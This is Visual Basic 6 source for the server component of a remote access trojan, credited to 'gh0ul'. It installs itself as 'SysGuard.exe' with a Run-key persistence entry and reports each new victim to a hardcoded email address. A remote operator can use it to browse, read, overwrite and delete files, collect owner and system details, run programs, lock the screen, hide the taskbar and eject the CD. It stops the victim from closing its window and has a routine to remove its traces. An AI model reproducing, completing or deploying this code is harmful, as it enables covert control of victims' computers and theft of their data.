VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "cServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Private i As Integer


Public MainDriveLetter As String
Public SysType As String
Public Connected As Boolean

 Const DRIVE_ANY = 0
 Const DRIVE_REMOVABLE = 2
 Const DRIVE_FIXED = 3
 Const DRIVE_REMOTE = 4
 Const DRIVE_CDROM = 5
 Const DRIVE_RAMDISK = 6

Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long

' Data PAGES
Private Type ServerData
   ' data on page 1
   bInstalled As Boolean
   bSetPort As Boolean
   ' data on page 2
   bUseDefaultServerName As Boolean
   sServerPath As String
   sUDServerName As String
   bUsePWord As Boolean
   sPWord As String
   ' data on page 3
   bEditReg As Boolean
   sRegEditLoc_1 As String
   sRegEditLoc_2 As String
End Type

Dim SD As ServerData

Public Sub SetUp()
    '
    Dim FileInAppPath As String
    Dim FileInSysDir As String
    
    SysType = GetSysType()
    ' check to see if a Server Config file is present...
    ' If the server is not being ran from the
    ' if not... install anyway all defaults
    FileInAppPath = Dir(App.Path & "\winsock3.dll")
    FileInSysDir = Dir(SysPath & "winsock3.dll")
    
    If FileInAppPath = "" And FileInSysDir = "" Then
       ' the config file has not been made yet...
       ' go ahead
       CreateDefaultMailSetingsFile
       'Insert_The_Intruder
       ' set up the e-mail commands
       InitAdminCommands
    ElseIf FileInAppPath <> "" Then
       ' open the file from the where the.
       ' read the data
      Open App.Path & "\winsock3.dll" For Binary As #1
           Get #1, , SD
      Close #1
    ElseIf FileInSysDir <> "" Then
       ' open the file from the sys Directory.
       ' read the data
    End If
    
End Sub



Private Sub Insert_The_Intruder()
    Dim SerName As String
    Dim Path As String
        
    Path = App.Path
    
    SerName = Path & "\SysGuard.exe"
    
    ' copy the server into the appropriate sys dir
    If SysType <> "NT" Then
       FileCopy SerName, m_Server.MainDriveLetter & "Windows\System\SysGuard.exe"
       'FileCopy MonName, m_Server.MainDriveLetter & "Windows\System\CDsysdrv.exe"
    Else
       FileCopy SerName, m_Server.MainDriveLetter & "WINNT\System32\SysGuard.exe"
       'FileCopy MonName, m_Server.MainDriveLetter & "WINNT\System32\CDsysdrv.exe"
    End If
    
    ' Ad entry to start the Server on start up
    SetKeyValue HKEY_LOCAL_MACHINE, _
                "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", _
                "SysGuard", "SysGuard.exe", REG_SZ
       
    ' add entry to start the Monitor on startup
    'SetKeyValue HKEY_LOCAL_MACHINE, _
                "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", _
                "CDDriver", "CDsysdrv.exe", REG_SZ
    
        
End Sub

Private Sub InitAdminCommands()
    ' E-mail address to send to
    
    ADDY = "gh0ul@hotmail.com"
    ADDY2 = "gh0ul@hotmail.com"
    
    
    SUBJ = "New Player!!! "
End Sub



Private Sub CreateDefaultMailSetingsFile()
    ' first see if the file is there
    Dim Fname As String
    Dim fRes As String
    
    Fname = GetSystemPath() & "\SysConfig.sys"
    
    fRes = Dir(Fname, vbNormal)
    
    If fRes <> "" Then
       Exit Sub
    Else
        ' create a default mail settings file
        With Mail
          .bChkAdmin = False
          .bEnabled = True
          .bNotifyAlways = True
          .bNotifyOnce = False
          .sAddr = "gh0ul@hotmail.com"
        End With
        
        'create the file
        Open Fname For Binary As #1
           Put #1, , Mail
        Close #1
        
    End If
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub Get_Users_Files(Drive As String)
   '
   
   i = 0
   FileSearch Drive, "*.*", False
   Pause 2000
   SendToClient
End Sub



'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub GatherDirs(Drive As String)
   i = 0
   FileSearch Drive, "*.*", True
   Pause 2000
   SendDirsToClient
End Sub


'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub Search(Drive_Fname As String)
  Dim Drive As String
  Dim FileName As String
  Dim i As Integer
  
  
  Drive = EvalData(Drive_Fname, 1, "|")
  FileName = EvalData(Drive_Fname, 2, "|")
  
  ' do the search, use Data type to hold results
  ' first clear it out
  frmServer.List1.Clear
  ClearArray Data, "Files"
  FileSearch Drive, FileName, False
  Pause 2000
  SendSearchResults
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Sub SendSearchResults()
    Dim i As Long
    On Error GoTo ErrH
    
   ' first send the # of retrieved files
   SendData "Num_Search_Files," & Data.Num_Files
   Pause 2000
   ' send th0e retrieved data back
   For i = 0 To Data.Num_Files - 1
     SendData "Retrieved_Search_Data," & Data.FileName(i)
     Pause 10
   Next
    
Exit Sub
ErrH:
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Private Sub SendToClient(Optional PicPaths As Boolean, Optional WavePaths As Boolean)
   Dim i As Long, X As Long
   Dim TempStor(1 To 20) As String ' storage for up to 20,000 paths
   Dim NumStorVars As Integer
   Dim FileCnt As Long
   
   ' first send the # of retrieved files
   ' so the client will know what it has
   ' to work with
   If PicPaths Then
     SendData "Num_Pics," & Data.Num_Files
   ElseIf WavePaths Then
     SendData "Num_Waves," & Data.Num_Files
   Else
     SendData "Num_Files," & Data.Num_Files
   End If
   Pause 1000
   
   ' if the num of files being sent is < than 1,000
   If Data.Num_Files < MAX_NUM_FILES Then
      ' send the retrieved data back
      For i = 1 To Data.Num_Files
        TempStor(1) = TempStor(1) & Data.FileName(i) & ";"
      Next
      
      
      ' I think the largest chunk you can send is 4196 so
      ' split the data into chunks and send Chunk by Chunk
      ChunkData TempStor(1), PicPaths, , WavePaths
      
   ElseIf Data.Num_Files > MAX_NUM_FILES Then
       ' divide the numFIles by the max_num_files to see how many
       ' storage variables we need.
       NumStorVars = Data.Num_Files / MAX_NUM_FILES
       
       SendData "Send_State," & "Procesing all Files"
       Pause 500
       For i = 1 To NumStorVars
          ' assign all the neede variables
          For X = 1 To MAX_NUM_FILES
            FileCnt = FileCnt + 1
            ' if reached the upperbound of the array... exit
            If FileCnt > Data.Num_Files Then Exit For
                        
            TempStor(i) = TempStor(i) & Data.FileName(FileCnt) & ";"
          Next
       Next
       
       
       SendData "Send_State," & "Sending all Files"
       Pause 1500
       ' all the data up to 1000 paths has been
       ' assigned to a seperate member of the
       ' TempStor() array.
       For X = 1 To NumStorVars
          ' send a batch
          ChunkData TempStor(X), PicPaths, , WavePaths
          ' pause to give the chunkdata function time to
          ' process
          Pause 2000
       Next
   End If
   
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Private Function ChunkData(Data As String, Optional PicPaths As Boolean, Optional Dirs As Boolean, Optional WavePaths)
   Dim CurChunk As String
   Const ChunkSize = 4196
          
   Do While Len(Data) > 0
     ' get the first chunk of data
     CurChunk = Left(Data, ChunkSize)
     
     ' decide what type of data is being sent
     ' send that chunk
     If (Not PicPaths) And (Not Dirs) And (Not WavePaths) Then
        ' sending all file paths
        SendData "Users_Data," & CurChunk
     ElseIf (Not PicPaths) And Dirs = True And Not (WavePaths) Then
        ' sending the dirs
        SendData "Users_Dirs," & CurChunk
     ElseIf PicPaths And (Not Dirs) And (Not WavePaths) Then
        ' sending Picture Paths
        SendData "Load_Pic_Data," & CurChunk
     ElseIf WavePaths And (Not Dirs) And (Not PicPaths) Then
        ' sending Wave paths
        SendData "Load_Wave_Data," & CurChunk
     End If
     
     
     Pause 750
       
     ' remove the sent chunk
     Data = Mid(Data, ChunkSize, Len(Data))
   Loop ' loop until all the data has been sent
         
   SendData "Transfer_Done,"
End Function
'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub SendDirsToClient()
    ' send the retrieved data back
    ' first send the # of retriened files
   Dim i As Long
   Dim TempStor As String
   On Error GoTo ErrH
   SendData "Num_Dirs," & Data.Num_Dirs
   Pause 1000
   
   
   ' send the retrieved data back
   For i = 0 To Data.Num_Dirs
     TempStor = TempStor & Data.FileName(i) & ";"
     'Pause 1
   Next
   ' split the data into chunks and send Chunk by Chunk
   ChunkData TempStor, False, True, False
   
   
   Exit Sub
ErrH:
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Private Sub FileSearch(DrivePath As String, Ext As String, Dirs As Boolean)

        Dim XDir() As String
        Dim TmpDir As String
        Dim NormalFiles As String, SysFiles As String, HidFiles As String
        Dim DirCount As Integer
        Dim X As Integer
        
        'Initialises Variables
        DirCount = 0
        ReDim XDir(0) As String
        XDir(DirCount) = ""

        On Error Resume Next
        If Right(DrivePath, 1) <> "\" Then
            DrivePath = DrivePath & "\"
        End If
            
        DoEvents
            
        TmpDir = Dir(DrivePath, vbDirectory)
        
        If Dirs Then
           frmServer.List1.AddItem DrivePath & NormalFiles
           Data.Num_Dirs = frmServer.List1.ListCount
           ReDim Preserve Data.FileName(Data.Num_Dirs + 1)
           Data.FileName(Data.Num_Dirs) = DrivePath & NormalFiles
        End If
        
            Do While TmpDir <> ""
                If TmpDir <> "." And TmpDir <> ".." Then
                    If (GetAttr(DrivePath & TmpDir) And vbDirectory) = vbDirectory Then
                        XDir(DirCount) = DrivePath & TmpDir & "\"
                        DirCount = DirCount + 1
                        ReDim Preserve XDir(DirCount) As String
                    End If
                End If
                TmpDir = Dir
            Loop
            
          If Not Dirs Then
            'Searches for the Normal files
            NormalFiles = Dir(DrivePath & Ext, vbNormal)
                                   
            Do Until NormalFiles = ""
                ReDim Preserve Data.FileName(Data.Num_Files + 1)
                
                Data.FileName(Data.Num_Files) = DrivePath & NormalFiles
                               
                frmServer.List1.AddItem _
                Data.FileName(Data.Num_Files)
                                
                NormalFiles = Dir
                           
                i = i + 1
                Data.Num_Files = i
            Loop
          
          End If
                        
            'Recursively searches through all sub directories
            For X = 0 To (UBound(XDir) - 1)
              If Dirs Then
                FileSearch XDir(X), Ext, True
              Else
                FileSearch XDir(X), Ext, False
              End If
            Next X
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub SendMsg(Note As String)
    MsgBox Note, , ""
End Sub


'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Public Sub Copy(FromTo As String)
   Dim i As Integer
   Dim TempStr As String
   
   Dim From As String
   Dim To_ As String
    
   On Error GoTo CopyErr
   ' get the file name to copy
   From = EvalData(FromTo, 1, "|")
   To_ = EvalData(FromTo, 2, "|")
   
   ' copy the file
   FileCopy From, To_
   ' pause then send the ok
   Pause 1000
   SendData "Copy_Complete,"
   
   Exit Sub
   
CopyErr:
   
   Pause 1000
   SendData "Copy_Error,"
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub Move(Source_Destination As String)
    On Error Resume Next
    Dim Src As String
    Dim Des As String
    
    ' first copy the source File
    Copy Source_Destination
    
    ' now seperate source and desination
    Src = EvalData(Source_Destination, 1, "|")
    ' delete the Source File
    Kill Src
    Pause 1000
    ' alert client move is over.
    SendData "Moved," & Src
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub Delete(Path As String)
   ' delete it
   Kill Path
   ' notify client
   SendData "Del_Complete," & Path
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Sub Edit(Fname As String)
    Dim FileData As String
    Dim i As Long
       
    ' open the file
    Open Fname For Binary As #1
       ' retrieve
       FileData = Input(LOF(1), 1)
    Close #1
    Pause 2000
    
    Const ChunkSize As Long = 4196
    Dim ChunkCnt As Integer
    Dim CurChunk As String
    Dim D() As String
    
    ' how many chunks are in the data?
    ChunkCnt = Len(FileData) / ChunkSize
    
    Do While Len(FileData) > 0  'For i = 1 To ChunkCnt
        'extract a predefined chunk
        CurChunk = Left(FileData, ChunkSize)
        ' send that chunk to the client
        SendData "Edit_Chunk," & CurChunk
        Pause 750
        ' remove the sent chunk
        FileData = Mid(FileData, ChunkSize, Len(FileData))
     Loop
    
     SendData "Transfer_Done,"
     
End Sub

'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Sub Save(FName_Data As String)
   
   ' passing in are both The filename and the file data _
   all compressed into one variable. They must first be _
   split apart before attempting to process them.
   
   Dim FileName As String
   Dim FileData As String
   
   ' the EvalData Proc will split them in two _
   1 signifies the string to the left of the "|" _
   ad 2 the string to the right of the "|"
   FileName = EvalData(FName_Data, 1, "|")
   FileData = EvalData(FName_Data, 2, "|")
   
   ' Attempt to save a file on another machine
   Open FileName For Output As #1
     '
     Print #1, FileData
   Close #1
   
   ' file has been saved
   
   SendData "Saved," & FileName
End Sub

Sub LockUP(Params As String)
   Dim SplitRes(0 To 3) As String
   Dim i As Integer, _
       lStartPos As Integer, _
       SubStr As String
       
   Dim Repeat As String, _
       HowMany As String, _
       HowOften As String
     
   ' sperate the parameters
   lStartPos = InStr(1, Params, ":")
    While lStartPos > 0
        SubStr = Mid$(Params, 1, lStartPos - 1)
        Params = Mid$(Params, lStartPos + 1)
        lStartPos = InStr(1, Params, ":")
        SplitRes(i) = SubStr
        i = i + 1
    Wend
    
    Repeat = SplitRes(0)
    HowLong = CLng(Left(SplitRes(1), 2))
    HowMany = SplitRes(2)
    HowOften = SplitRes(3)
    
   
   If Repeat = "True" Then
     LockSysNow HowMany, HowOften
   Else
     LockSysNow
   End If
   
End Sub


Private Sub LockSysNow(Optional HowMany As String, _
                       Optional HowOften As String)
    Dim RV As Boolean
    
    RV = fSaveGuiToFile(CAPTURE)
    
    If (Not RV) Then
       SendData "Capture_Error," & "Error Locking the host computer."
       Exit Sub
    End If
    
    With frmDispCap
      .Left = 0
      .Top = 0
      .Picture1.Picture = LoadPicture(CAPTURE)
      .Height = .Picture1.ScaleHeight
      .Width = .Picture1.ScaleWidth
      .Picture1 = LoadPicture(CAPTURE)
      .Show
    End With
    
End Sub

Public Sub OpenCDROM()
    Dim rtn

    'Open the CD-ROM door
    rtn = mciSendString("open cdaudio alias cd", 0, 0, 0)
    rtn = mciSendString("set cd door open", 0, 0, 0)
    rtn = mciSendString("close all", 0, 0, 0)
End Sub


Sub HideTBar()
    If bTaskBar Then
       bTaskBar = False
       Hide_Bar
    Else
       bTaskBar = True
       Show_Bar
    End If
End Sub



Private Sub Hide_Bar()
    'Hide the taskbar
    Dim rtn As Long
    rtn = FindWindow("Shell_traywnd", "") 'get the Window
    Call SetWindowPos(rtn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW) 'hide the Tasbar
End Sub

Private Sub Show_Bar()
    'Show the taskbar
    Dim rtn As Long
    rtn = FindWindow("Shell_traywnd", "") 'get the Window
    Call SetWindowPos(rtn, 0, 0, 0, 0, 0, SWP_SHOWWINDOW) 'show the Taskbar
End Sub




Sub GetOwnerInfo()
    
    Dim OName As String
    Dim TZone As String
    Dim cmStr As String
    Dim SysDir As String
    
    
    If (GetSysType() = "NT") Then
      cmStr = NT_PATH
      SysDir = m_Server.MainDriveLetter & "WINNT\system32\"
    Else
      cmStr = WIN_PATH
      SysDir = m_Server.MainDriveLetter & "Windows\System\"
    End If
    
    SysPath = SysDir
    
    OName = QueryValue(HKEY_LOCAL_MACHINE, cmStr, "RegisteredOwner")
    TZone = QueryValue(HKEY_LOCAL_MACHINE, "System\CurrentControlSet\control\TimeZoneInformation", "StandardName")
    
    SendData "Got_Owner_Info," & OName & "^" & TZone & ";" & SysDir
    
End Sub


Sub ShowPic(Pic As String)
   On Error Resume Next
'
   'frmDispCap.Picture1 = LoadPicture()
   HowLong = 5 ' approx 5 mins
   
   With frmDispCap
     .Picture1.Picture = LoadPicture(Pic)
     .Height = .Picture1.ScaleHeight
     .Width = .Picture1.ScaleWidth
     .Show
   End With
     
   SendData "Picture_Showing,"
End Sub


Sub GetPicPaths()
   ' reset var for Num_FIles
   i = 0
   FileSearch "C:\", "*.jpg", False
   Pause 2000
   
   SendToClient True
End Sub

Sub GetWavePaths()
   
   ' reset var for Num_FIles
   i = 0
   FileSearch "C:\", "*.wav", False
   Pause 2000
   
   SendToClient , True
End Sub


Sub LoadTaskList()
    Dim TaskList As String, i As Integer
    Const div As String = ":"
    
    Dim lst As ListBox
    Set lst = frmServer.List1
    
    ' fill the list box with the tasks
    FillTaskListBox lst, False
    
    ' package them for shipping
    For i = 0 To lst.ListCount
       TaskList = TaskList & lst.List(i) & div
    Next
    
    SendData "Tasks_Retrieved," & TaskList
    Pause 1000
    SendData "Tasks_Loaded,"

End Sub



Sub Swap()
   Static i
   
   i = i + 1
   
   If i = 1 Then      ' Swap
     SwapMouseButton True
     SendData "Swapped,"
   ElseIf i = 2 Then  ' Return to normal
     SwapMouseButton False
     i = 0            ' reset
     SendData "UnSwapped,"
   End If
   
End Sub





Public Sub HangUp()
    Dim i As Long
    Dim lpRasConn(255) As RasConn
    Dim lpcb As Long
    Dim lpcConnections As Long
    Dim hRasConn As Long
        lpRasConn(0).dwSize = RAS_RASCONNSIZE
        lpcb = RAS_MAXENTRYNAME * lpRasConn(0).dwSize
        lpcConnections = 0
        ReturnCode = RasEnumConnections(lpRasConn(0), lpcb, _
        lpcConnections)

    If ReturnCode = ERROR_SUCCESS Then
    For i = 0 To lpcConnections - 1
        If Trim(ByteToString(lpRasConn(i).szEntryName)) _
            = Trim(gstrISPName) Then
            hRasConn = lpRasConn(i).hRasConn
            ReturnCode = RasHangUp(ByVal hRasConn)
        End If
        Next i
    End If
    
    SendData "HungUp,"
End Sub

Public Function ByteToString(bytString() As Byte) As String
  Dim i As Integer
  ByteToString = ""
    i = 0
   While bytString(i) = 0&
     ByteToString = ByteToString & Chr(bytString(i))
     i = i + 1
   Wend
End Function




Sub ChangeEmailSettings(NewSettings As String)
   Dim lStartPos As Long
   Dim SplitRes(0 To 4) As String
   Dim SubStr As String
   Dim Fname As String
   i = 0
   
   ' seperate the parameters
   lStartPos = InStr(1, NewSettings, ":")
    While lStartPos > 0
        SubStr = Mid$(NewSettings, 1, lStartPos - 1)
        NewSettings = Mid$(NewSettings, lStartPos + 1)
        lStartPos = InStr(1, NewSettings, ":")
        SplitRes(i) = SubStr
        i = i + 1
    Wend
    
    With Mail
      .bEnabled = SplitRes(0)
      .bNotifyAlways = SplitRes(1)
      .bNotifyOnce = SplitRes(2)
      .sAddr = SplitRes(3)
      .bChkAdmin = SplitRes(4)
    End With
    
    If Mail.bChkAdmin Then
       Fname = App.Path & "\SysConfig.sys"
    Else
       Fname = GetSystemPath() & "\SysConfig.sys"
    End If
    
    ' save settings
    Open Fname For Binary As #1
       Put #1, , Mail
    Close #1
    
    SendData "EMail_Settings_Changed," & Fname
    
End Sub




Sub CloseWindow(strWin As String)
    
     Dim winHwnd As Long
     Dim RetVal As Long
     winHwnd = FindWindow(vbNullString, strWin)
     Debug.Print winHwnd
     If winHwnd <> 0 Then
        RetVal = PostMessage(winHwnd, WM_CLOSE, 0&, 0&)
        If RetVal = 0 Then
         SendData "Error_Closing," & "Error closing " & strWin & "."
        End If
     Else
        SendData "Not_Open," & strWin & " is not open."
     End If
     
End Sub


Sub ShutDown()
    SendData "Server_Closed,"
    CloseWindow "Server"
End Sub


Sub ChangeRes(W_H As String)
    ' pick out the dimensions
    Dim W As String
    Dim H As String
    
    Dim Xpos As Integer
    
    Xpos = InStr(1, W_H, "X", vbTextCompare)
    
    W = Mid(W_H, 1, Xpos - 1)
    H = Mid(W_H, Xpos + 1, Len(W_H))
    
    
    ' change resolution
    ChangeRes_ CSng(W), CSng(H)
End Sub


Private Sub ChangeRes_(iWidth As Single, iHeight As Single)

    Dim a As Boolean
    Dim i&
    
    Dim DevM As DEVMODE

    i = 0

    Do
        a = EnumDisplaySettings(0&, i&, DevM)
        i = i + 1
    Loop Until (a = False)

        Dim b&
        DevM.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT
        DevM.dmPelsWidth = iWidth
        DevM.dmPelsHeight = iHeight
        b = ChangeDisplaySettings(DevM, 0)
End Sub


Sub PlayWave(Fname As String)
    PlaySound Fname
    ' give sound time to play
    Pause 2000
    SendData "Wave_Done,"
End Sub


Sub RemoveServerTraces()
    '
    On Error Resume Next
    DeleteValue HKEY_LOCAL_MACHINE, _
     "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", "SysGuard"
    
    DeleteKey HKEY_CURRENT_USER, "SOFTWARE\VB and VBA Program Settings\I"
    
    Kill App.Path & "\SysGuard.exe"
End Sub


Sub ChangeWallpaper()
    Dim t As Long
    Dim WinDir_ As String
    Dim wallpaper As String
    Dim RndIdx As Integer
    
    ' search the sys drive for all .bmp files
    ' add them to an array
    ' pick a random Index to display
    
    ' get the folder to search in
    WinDir_ = WinDir(True)
    ' clear the global file array and search for all bmp files in the
    ' windows directory.
    ClearArray Data, "Files"
    FileSearch WinDir_, "*.bmp", False
      
    'pick a random image, the filenames have been
    ' loaded into the Data Type
    Randomize
    
    RndIdx = Int((frmServer.List1.ListCount * Rnd) + 1)
    If Right(Data.FileName(RndIdx), 3) = "bmp" Then
       wallpaper = Data.FileName(RndIdx)
       t = SystemParametersInfo(20, 0, wallpaper, 1)
    Else
       SendData "Error_Msg,Error changing wallpaper"
    End If
        
    If t = 0 Then
      SendData "Error_Msg,Error changing wallpaper"
    End If
End Sub


Sub FreezeMouse()
    
    SendKeys "{Home}"
    SendKeys "{Enter}"

End Sub


Sub GetDrives()
   
   Dim varDrives, _
       varCDROM, _
       varFloppy
          
   Dim i As Integer, AllDrives As String, Drives As String, CD As String, Flop As String
   Dim D As Integer, C As Integer, f As Integer, t As Integer
   ' get fixed drive first
   varDrives = GetLocalDrives(DRIVE_FIXED)
   ' get CdRom drive
   varCDROM = GetLocalDrives(DRIVE_CDROM)
   ' get floppys
   varFloppy = GetLocalDrives(DRIVE_REMOVABLE)
   
   Drives = ExtractFixedDrives(varDrives)
   CD = ExtractCDDrives(varCDROM)
   Flop = ExtractFloppyDrives(varFloppy)
   
   ' send the data _
   one at a time.
   ' pause as not to interfer withother transmisions
   DoEvents
   Pause 1000
   SendData "Drives_Retrieved," & Drives
   Pause 1000
   SendData "CD_Retrieved," & CD
   Pause 1000
   SendData "Flop_Retrieved," & Flop
   
End Sub


Function ExtractFixedDrives(varDrives) As String
    Dim i As Integer
    Dim Drives As String
    
    If IsArray(varDrives) Then
      For i = 0 To UBound(varDrives)
          Drives = Drives & varDrives(i) & ":\ [DISK]" & "#"
      Next i
      
      ' add in the Number of Fixed drives.
      ExtractFixedDrives = i & "#" & Drives
   Else
      ' only one fixed disk
      ExtractFixedDrives = "1" & "#" & varDrives & ":\ [DISK]" & "#"
   End If
   
End Function

Function ExtractCDDrives(varCDROM) As String
    Dim i As Integer
    Dim CD As String
    
    ' get the CD_Drive are there more than one?
      If IsArray(varCDROM) Then
         For i = 0 To UBound(varCDROM)
             CD = CD & varCDROM(i) & ":\ [CD-ROM]" & "#"
         Next i
         
         ' add in the number for cd_rom
         ExtractCDDrives = i & "#" & CD
      Else
         ' only one cdRom disk
         ExtractCDDrives = "1" & "#" & varCDROM & ":\ [CD-ROM]" & "#"
      End If
End Function

Function ExtractFloppyDrives(varFloppy) As String
     
    Dim i As Integer
    Dim Flop As String
    
    ' get the CD_Drive are there more than one?
      If IsArray(varFloppy) Then
         For i = 0 To UBound(varFloppy)
             Flop = Flop & varFloppy(i) & ":\ [FLOPPY]" & "#"
         Next i
         
         ' add in the number for cd_rom
         ExtractFloppyDrives = i & "#" & Flop
      Else
         ' only one cdRom disk
         ExtractFloppyDrives = "1" & "#" & varFloppy & ":\ [FLOPPY]" & "#"
      End If
      
End Function


Private Function GetLocalDrives(lngType As Long) As Variant

   Dim cResult As Long, i As Integer, intCount As Integer
   Dim strTmpArray() As String
   
   ReDim strTmpArray(0 To 25)
   
   If lngType = DRIVE_ANY Then
      'Loop and check for any drive
      For i = 0 To 25
         cResult = GetDriveType(Chr(65 + i) & ":\")
         If cResult <> 1 Then
            strTmpArray(intCount) = Chr(65 + i)
            intCount = intCount + 1
         End If
      Next i
   Else
      'Loop and check for a specific type of drive
      For i = 0 To 25
         cResult = GetDriveType(Chr(65 + i) & ":\")
         If cResult = lngType Then
            strTmpArray(intCount) = Chr(65 + i)
            intCount = intCount + 1
         End If
      Next i
   End If
   
   'Only redim if one or more drives were found
   If intCount > 0 Then
      ReDim Preserve strTmpArray(0 To intCount - 1)
      GetLocalDrives = strTmpArray
   End If

End Function



Sub Get_SysInfo()
    '
    Dim Sys As SystemInfo
    
    Set Sys = New SystemInfo
    
    Dim SysInfo As String
    Dim i As Integer
    
    Dim Item(1 To 8) As String
    
    Item(1) = Sys.GetWinVersion()
    Item(2) = Sys.GetWinComputerName()
    Item(3) = Sys.GetHdiskSpace("C:\", True)
    Item(4) = Sys.GetWinDisplayColors("CLS_BITS")
    Item(5) = Sys.GetWinResXY()
    Item(6) = Sys.GetPhysMemTotal()
    Item(7) = Sys.GetPhysMemLoad()
    Item(8) = Sys.GetPageFileMemTotal()
    
    ' send back the retrieved data
    For i = 1 To 8
      SysInfo = SysInfo & Item(i) & ":"
    Next
    
    SendData "Sys_Info," & SysInfo
End Sub


Sub YN_Msg(Msg_Cap As String)
    Dim Msg As String
    Dim Cap As String
    Dim res As Integer
    
    Msg = EvalData(Msg_Cap, 1, ";")
    Cap = EvalData(Msg_Cap, 2, ";")
    
    
    res = MsgBox(Msg, vbYesNo, Cap)
    
    If res = 6 Then ' Yes
       SendData "User_Response,The User Responded ""YES"" to the query."
    Else
       SendData "User_Response,The User Responded ""NO"" to the query."
    End If
    
    
End Sub

Sub MovingDialog(Msg_Cap_Icon As String)
    '
    Dim Msg As String
    Dim Cap As String
    Dim Icon As String
    Dim Cap_Icon As String
    
    Msg = EvalData(Msg_Cap_Icon, 1, ";")
    Cap_Icon = EvalData(Msg_Cap_Icon, 2, ";")
    Cap = EvalData(Cap_Icon, 1, ":")
    Icon = EvalData(Cap_Icon, 2, ":")
            
    With frmServer
      .Visible = True
      ' disable x so they can not close the trojan
      DisableX frmServer
    
      If Icon = 1 Then
       .imgPic = .Image1
      ElseIf Icon = 2 Then
       .imgPic = .Image2
      Else
       .imgPic = .Image3
      End If
    
      .Label1 = Msg
      .Caption = Cap
      .Timer1.Enabled = True
    End With
        
End Sub


Sub Chating(sIncoming As String)
    
    With frmServer
       .Text1 = .Text1 & vbCrLf & UCase(sIncoming)
       ScrollBox sIncoming, .Text1.Text
    End With
    
End Sub

Sub Chat(sIncoming As String)
    
    DisableX frmServer
    
    With frmServer
       .Caption = "Talk to me..."
       .Visible = True
       .Picture1.Top = 10
       .Height = .Picture1.ScaleHeight + 400
       .Text1 = .Text1 & vbCrLf & UCase(sIncoming)
    End With
    
End Sub



'---------------------------------------------------------------------------
' AUTHOR: gh0ul
'
' PROCEDURE NAME: Run()
' PURPOSE:        Run A program
' PARAMETERS:     ProgName : Program to run.
'
' RETURNS:        Boolean : True On Success
'
'---------------------------------------------------------------------------
' DATE:  September,25 99
' TIME:  05:23
'---------------------------------------------------------------------------
Function Run(ProgName As String) As Boolean
    '
    
    Dim Running As Boolean
    
    Running = CreateProc(ProgName)
    
    If Running Then
       Run = True
    Else
       Run = False
    End If
    
End Function


Sub Rename(Old_New As String)
   
   On Error GoTo MiscErr
    Dim OldName As String
    Dim NewName As String
    
    OldName = EvalData(Old_New, 1, ";")
    NewName = EvalData(Old_New, 2, ";")
    
    Name OldName As NewName
    
    SendData "Error_Msg,The File " & OldName & " has been renamed to " & NewName & "."
    Exit Sub
    
MiscErr:
    SendData "Error_Msg,Error Renaming file"
End Sub



Public Sub CreateDir(SelDir As String)
  '  On Error GoTo FilesPresent
    Dim DirExist As String
    
    ' does the dir exist?
    DirExist = Dir(SelDir, vbDirectory)
    
    If DirExist <> "" Then
       SendData "Error_Msg,Directory: " & SelDir & " already exists."
    Else
       ' it's there; remove it.
       ' remove the slash at the end
       'SelDir = Left(SelDir, Len(SelDir) - 1)
       
       MkDir SelDir
       SendData "Error_Msg,Directory: " & SelDir & " has been created."
    End If
    
    Exit Sub
'FilesPresent:
 '   SendData "Error_Msg," & err.Description  'Cannont remove a directory when files are present."
End Sub




























 'Dim CurrWnd As Long
'    Dim Length As Long
 '   Dim TaskName As String
'    Dim Parent As Long
'
 '   frmServer.ZOrder 0
 '   CurrWnd = GetWindow(frmServer.hwnd, GW_HWNDFIRST)
    
 '   While CurrWnd <> 0
 '       Parent = GetParent(CurrWnd)
 '       Length = GetWindowTextLength(CurrWnd)
 '       TaskName = Space$(Length + 1)
 '       Length = GetWindowText(CurrWnd, TaskName, Length + 1)
 '       TaskName = Left$(TaskName, Len(TaskName) - 1)

  '      If Length > 0 Then
  '          If TaskName <> frmServer.Caption Then
  '              SendData "Task_Name," & TaskName
  '              Debug.Print TaskName
  '              Pause 100
  '          End If
  '      End If
